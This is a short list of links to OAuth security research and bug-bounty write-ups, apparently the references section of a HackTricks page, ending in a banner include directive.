- [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
- [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [**https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html**](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [An Offensive Guide to the OAuth 2.0 Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)
- [OAuth Discovery as an RCE Vector (Amla Labs)](https://amlalabs.com/blog/oauth-cve-2025-6514/)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)

{{#include ../banners/hacktricks-training.md}}
